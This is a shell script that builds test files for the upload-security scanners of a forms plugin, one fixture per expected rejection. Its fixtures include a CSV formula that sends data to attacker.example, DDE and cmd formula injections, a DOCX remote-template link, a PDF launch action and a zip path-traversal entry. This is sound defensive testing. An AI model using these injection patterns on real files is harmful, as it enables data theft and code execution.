#!/usr/bin/env bash
#
# Generates harmless test files that exercise each scanner in
# src/Validation/FileSecurity/. Run once, then upload each file via a
# public Eightshift Forms file field and verify the matching rejection.
#
# Usage:  ./generate-test-files.sh [output_dir]
#         defaults to ./test-files

set -euo pipefail

OUT="${1:-test-files}"
mkdir -p "$OUT"
cd "$OUT"

echo "Generating into: $(pwd)"

# ---------------------------------------------------------------------------
# 1. Extension deny-list (rejected before any content scan).
# Expected label: validationFileExtensionDenied
# ---------------------------------------------------------------------------
echo "harmless content"                       > deny-shell.exe
echo "<?php echo 'not real'; ?>"              > deny-script.php
echo "fake batch"                             > deny-batch.bat
# SVG is in the default deny-list too, so this never reaches the SVG scanner.
echo '<svg><script>alert(1)</script></svg>'   > deny-evil.svg

# ---------------------------------------------------------------------------
# 2. MIME mismatch — .pdf extension but JPEG magic bytes.
# Expected label: validationFileMimeMismatch
# ---------------------------------------------------------------------------
printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x01' > mime-mismatch.pdf

# ---------------------------------------------------------------------------
# 3. PDF — uncompressed dangerous key (JavaScript autoload).
# Expected label: validationFilePdfUnsafe
# ---------------------------------------------------------------------------
cat > pdf-javascript.pdf <<'EOF'
%PDF-1.4
1 0 obj << /Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert('test')) >> >> endobj
xref
0 1
0000000000 65535 f
trailer << /Root 1 0 R >>
%%EOF
EOF

# PDF with /Launch action (executes external app on open).
cat > pdf-launch.pdf <<'EOF'
%PDF-1.4
1 0 obj << /Type /Action /S /Launch /F (cmd.exe) >> endobj
xref
0 1
0000000000 65535 f
trailer << /Root 1 0 R >>
%%EOF
EOF

# PDF with /EmbeddedFile (file smuggling).
cat > pdf-embedded.pdf <<'EOF'
%PDF-1.4
1 0 obj << /Type /Filespec /EmbeddedFile 2 0 R >> endobj
xref
0 1
0000000000 65535 f
trailer << /Root 1 0 R >>
%%EOF
EOF

# ---------------------------------------------------------------------------
# 4. CSV — spreadsheet formula injection.
# Expected label: validationFileCsvUnsafe
# ---------------------------------------------------------------------------
cat > csv-formula.csv <<'EOF'
name,note
Alice,=cmd|'/c calc.exe'!A1
Bob,=HYPERLINK("http://attacker.example/log?u="&A1,"Click me")
Carol,@DDE(cmd,/c calc.exe,!)
EOF

# ---------------------------------------------------------------------------
# 5. ZIP — contains a deny-listed executable.
# Expected label: validationFileArchiveUnsafe
# ---------------------------------------------------------------------------
TMP_EXE=$(mktemp -d)/payload.exe
printf 'MZ\x90\x00fake-executable' > "$TMP_EXE"
zip -q archive-with-exe.zip "$TMP_EXE"
rm -rf "$(dirname "$TMP_EXE")"

# ---------------------------------------------------------------------------
# 6. ZIP — path traversal in member name.
# Expected label: validationFileArchiveUnsafe
# ---------------------------------------------------------------------------
python3 - <<'PY'
import zipfile
with zipfile.ZipFile('archive-traversal.zip', 'w') as z:
    z.writestr('../../etc/passwd', 'fake:x:0:0::/root:/bin/sh')
PY

# ---------------------------------------------------------------------------
# 7. ZIP — bomb (compression ratio > 100).
# Expected label: validationFileArchiveUnsafe
# ---------------------------------------------------------------------------
python3 - <<'PY'
import zipfile
data = b'A' * (10 * 1024 * 1024)  # 10 MB of 'A' compresses to a few KB.
with zipfile.ZipFile('archive-bomb.zip', 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr('bomb.txt', data)
PY

# ---------------------------------------------------------------------------
# 8. DOCX — macro-bearing (vbaProject.bin entry).
# Expected label: validationFileOfficeUnsafe
# ---------------------------------------------------------------------------
python3 - <<'PY'
import zipfile
with zipfile.ZipFile('office-with-macro.docx', 'w') as z:
    z.writestr('[Content_Types].xml',
        '<?xml version="1.0"?>'
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>')
    z.writestr('word/document.xml',
        '<?xml version="1.0"?><document>hi</document>')
    z.writestr('word/vbaProject.bin', b'fake-macro-bytes')
PY

# DOCX with external-target relationship (template / DDE injection vector).
python3 - <<'PY'
import zipfile
rels = (
    '<?xml version="1.0"?>'
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
    'Target="http://attacker.example/payload.dotm" TargetMode="External"/>'
    '</Relationships>'
)
with zipfile.ZipFile('office-external-rel.docx', 'w') as z:
    z.writestr('[Content_Types].xml',
        '<?xml version="1.0"?>'
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>')
    z.writestr('word/_rels/document.xml.rels', rels)
PY

# ---------------------------------------------------------------------------
# 9. TXT — smuggled PHP open tag.
# Expected label: validationFileTextUnsafe
# ---------------------------------------------------------------------------
cat > text-php.txt <<'EOF'
This looks like an innocent text file.
<?php echo 'should never reach disk'; ?>
EOF

# TXT — shell script shebang.
cat > text-shebang.txt <<'EOF'
#!/bin/bash
echo "this is not a text file"
EOF

# ---------------------------------------------------------------------------
# 10. JPEG — truncated / unparseable.
# Expected label: validationFileImageUnsafe
# ---------------------------------------------------------------------------
# Valid magic bytes but no real image data → getimagesize() returns false.
printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' > image-broken.jpg

# ---------------------------------------------------------------------------
# 11. EICAR — standard non-malicious AV test signature. Only triggers when
# the es_forms_validation_file_security_external_scanner filter is wired
# to ClamAV. The structural scanners ignore it.
# Expected label (when ClamAV is wired): validationFileAntivirus
# ---------------------------------------------------------------------------
printf 'X5O!P%%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > eicar.txt

# ---------------------------------------------------------------------------
# 12. CLEAN baseline — should pass every layer.
# Expected: upload succeeds.
# ---------------------------------------------------------------------------
cat > clean.txt <<'EOF'
Plain text, nothing interesting, used as a sanity check.
EOF

# Minimal valid one-page PDF with no dangerous keys.
cat > clean.pdf <<'EOF'
%PDF-1.4
1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj
2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj
3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >> endobj
xref
0 4
0000000000 65535 f
0000000009 00000 n
0000000053 00000 n
0000000100 00000 n
trailer << /Size 4 /Root 1 0 R >>
startxref
160
%%EOF
EOF

# ---------------------------------------------------------------------------
# C2PA Content Credentials cases. A JUMBF superbox is: BE32 box length,
# 'jumb', BE32 description length, 'jumd', then the registered C2PA UUID.
# The 32-byte payload plus the 32-byte header makes 64 — which is what the
# box length field and the stream /Length must both say.
#
# Each fixture carries a real page tree so qpdf can process it.
# ---------------------------------------------------------------------------

# Shared JUMBF payload, exactly 64 bytes.
c2pa_payload() {
  printf '\x00\x00\x00\x40jumb\x00\x00\x00\x1ejumd\x63\x32\x70\x61\x00\x11\x00\x10\x80\x00\x00\xaa\x00\x38\x9b\x71'
  printf 'C2PA-STRUCTURE-ONLY-TEST-FIXTURE'
}

c2pa_tail() {
  printf '6 0 obj << /Type /Pages /Kids [7 0 R] /Count 1 >> endobj\n'
  printf '7 0 obj << /Type /Page /Parent 6 0 R /MediaBox [0 0 612 792] >> endobj\n'
  printf 'trailer << /Size 8 /Root 1 0 R >>\n%%%%EOF\n'
}

# Genuine manifest — EXPECTED TO BE ACCEPTED when the exemption is enabled.
{
  printf '%%PDF-1.4\n'
  printf '1 0 obj << /Type /Catalog /Pages 6 0 R /AF [2 0 R] /Names << /EmbeddedFiles << /Names [(Content Credentials) 2 0 R] >> >> >> endobj\n'
  printf '2 0 obj << /Type /FileSpec /AFRelationship /C2PA_Manifest /F (Content Credentials) /EF << /F 3 0 R >> /Subtype (application/c2pa) >> endobj\n'
  printf '3 0 obj << /Length 64 >>\nstream\n'
  c2pa_payload
  printf '\nendstream endobj\n'
  c2pa_tail
} > pdf-c2pa-valid.pdf

# Correct labels, wrong bytes — EXPECTED TO BE REJECTED.
# This is the attack the exemption must stop.
{
  printf '%%PDF-1.4\n'
  printf '1 0 obj << /Type /Catalog /Pages 6 0 R /AF [2 0 R] /Names << /EmbeddedFiles << /Names [(Content Credentials) 2 0 R] >> >> >> endobj\n'
  printf '2 0 obj << /Type /FileSpec /AFRelationship /C2PA_Manifest /F (Content Credentials) /EF << /F 3 0 R >> /Subtype (application/c2pa) >> endobj\n'
  printf '3 0 obj << /Length 64 >>\nstream\n'
  printf 'MZ\x90\x00This is where an executable payload would sit, mislabelled.\x00\x00'
  printf '\nendstream endobj\n'
  c2pa_tail
} > pdf-c2pa-mislabelled.pdf

# Genuine manifest PLUS an ordinary attachment — EXPECTED TO BE REJECTED.
{
  printf '%%PDF-1.4\n'
  printf '1 0 obj << /Type /Catalog /Pages 6 0 R /Names << /EmbeddedFiles << /Names [(Content Credentials) 2 0 R (notes.txt) 4 0 R] >> >> >> endobj\n'
  printf '2 0 obj << /Type /FileSpec /AFRelationship /C2PA_Manifest /EF << /F 3 0 R >> >> endobj\n'
  printf '3 0 obj << /Length 64 >>\nstream\n'
  c2pa_payload
  printf '\nendstream endobj\n'
  printf '4 0 obj << /Type /FileSpec /EF << /F 5 0 R >> >> endobj\n'
  printf '5 0 obj << /Length 10 >>\nstream\nplain text\nendstream endobj\n'
  c2pa_tail
} > pdf-c2pa-mixed.pdf

# Genuine manifest PLUS JavaScript — EXPECTED TO BE REJECTED (exemption must
# not apply when any other dangerous key matched).
{
  printf '%%PDF-1.4\n'
  printf '1 0 obj << /Type /Catalog /Pages 6 0 R /AF [2 0 R] /Names << /EmbeddedFiles << /Names [(Content Credentials) 2 0 R] >> >> /OpenAction 8 0 R >> endobj\n'
  printf '2 0 obj << /Type /FileSpec /AFRelationship /C2PA_Manifest /F (Content Credentials) /EF << /F 3 0 R >> /Subtype (application/c2pa) >> endobj\n'
  printf '3 0 obj << /Length 64 >>\nstream\n'
  c2pa_payload
  printf '\nendstream endobj\n'
  printf '8 0 obj << /S /JavaScript /JS (app.alert\050 1 \051) >> endobj\n'
  c2pa_tail
} > pdf-c2pa-plus-js.pdf

echo
echo "Done. Files generated in: $(pwd)"
ls -la
